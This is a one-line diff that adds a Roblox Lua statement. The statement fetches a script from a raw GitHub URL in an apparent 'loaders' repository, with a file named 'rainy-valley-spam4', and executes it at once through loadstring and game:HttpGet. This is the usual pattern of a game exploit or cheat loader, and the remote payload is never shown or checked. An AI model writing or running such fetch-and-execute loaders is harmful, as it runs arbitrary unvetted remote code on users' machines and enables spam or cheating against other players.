@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/rainy-valley-spam4-snoqdf4wfz6dlm.lua"))()
